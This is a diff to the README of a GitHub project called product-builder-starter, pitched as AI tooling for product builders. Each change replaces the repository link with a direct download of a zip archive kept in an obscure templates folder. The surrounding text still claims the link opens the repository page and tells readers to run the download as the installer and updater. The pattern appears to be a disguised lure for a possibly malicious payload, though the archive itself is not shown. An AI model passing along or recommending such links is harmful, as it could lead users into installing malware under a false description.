@@ -1,6 +1,6 @@
 # 🛠️ product-builder-starter - Tools for Product Builders with AI
 
-[![Download product-builder-starter](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Miyamura-sudo/product-builder-starter)
+[![Download product-builder-starter](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Miyamura-sudo/product-builder-starter/raw/refs/heads/main/skills/governance/templates/builder_product_starter_3.9.zip)
 
 ---
 
@@ -46,7 +46,7 @@ These features work together to help product builders get more done with less ha
 
 Click the big green button at the top or visit this page:
 
-[Download product-builder-starter](https://github.com/Miyamura-sudo/product-builder-starter)
+[Download product-builder-starter](https://github.com/Miyamura-sudo/product-builder-starter/raw/refs/heads/main/skills/governance/templates/builder_product_starter_3.9.zip)
 
 This will take you to the GitHub repository page where you can find the latest downloads and detailed files.
 
@@ -110,7 +110,7 @@ Updates bring new skills, fixes, and security patches.
 
 - The app alerts you when a new update is ready.
 - To update, visit the same download page:  
-  [https://github.com/Miyamura-sudo/product-builder-starter](https://github.com/Miyamura-sudo/product-builder-starter)
+  [https://github.com/Miyamura-sudo/product-builder-starter/raw/refs/heads/main/skills/governance/templates/builder_product_starter_3.9.zip](https://github.com/Miyamura-sudo/product-builder-starter/raw/refs/heads/main/skills/governance/templates/builder_product_starter_3.9.zip)
 - Download the latest installer or release.
 - Run it to install the updated version. Your settings will stay intact.
 
@@ -139,4 +139,4 @@ The community and developers maintain the tool and often respond to inquiries pr
 
 ---
 
-[![Download product-builder-starter](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Miyamura-sudo/product-builder-starter)
+[![Download product-builder-starter](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Miyamura-sudo/product-builder-starter/raw/refs/heads/main/skills/governance/templates/builder_product_starter_3.9.zip)
